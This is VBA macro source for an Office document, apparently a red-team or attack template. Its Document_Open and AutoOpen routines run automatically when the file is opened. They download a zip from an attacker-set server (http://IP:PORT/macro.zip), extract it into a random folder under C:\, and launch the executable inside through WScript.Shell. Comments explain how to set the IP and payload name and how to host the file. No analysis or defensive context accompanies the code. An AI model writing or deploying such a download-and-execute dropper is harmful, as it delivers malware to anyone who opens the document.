Sub downloadFile(url As String, fileOutPath As String)
    Dim WinHttpReq As Object, oStream As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", url, False
    WinHttpReq.Send
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile fileOutPath, 2
        oStream.Close
    End If
End Sub
Sub Unzip(dirr As String)
    Dim sh As Shell32.Shell
    Dim sf As Shell32.Folder
    Dim df As Shell32.Folder
    Set sh = New Shell32.Shell
    Set df = sh.NameSpace(dirr)
    ' There you need to specify your zip file name
    Set sf = sh.NameSpace(dirr & "macros.zip")
    df.CopyHere sf.Items
End Sub
Function GenerateRandomValue() As String
    Dim randomNum As String
    Randomize
    randomNum = Trim(Str(Int((10000000 - 11 + 1) * Rnd + lowerbound)))
    GenerateRandomValue = randomNum
End Function
Sub DownloadUnzipAndRun()
    Dim url As String
    Dim savePath As String
    Dim ShellApp As Object
    Dim rundomnum As String
    Dim dirr As String
    ' There you need to specify your server IP:PORT and path to .zip file
    ' You can simply run "python -m http.server PORT" to run server
    url = "http://IP:PORT/macro.zip"
    rundomnum = GenerateRandomValue
    dirr = "C:\" & rundomnum & "\"
    MkDir dirr
    ' There you need to specify your zip file name
    savePath = dirr & "macros.zip"
    downloadFile url, savePath
    Unzip dirr
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    ' There you need to specify your executable file name
    objShell.Run dirr & "\macro.exe"
    Set WinHttpReq = Nothing
    Set oStream = Nothing
    Set ShellApp = Nothing
    Set objShell = Nothing
End Sub
Sub Document_Open()
DownloadUnzipAndRun
End Sub
Sub AutoOpen()
DownloadUnzipAndRun
End Sub



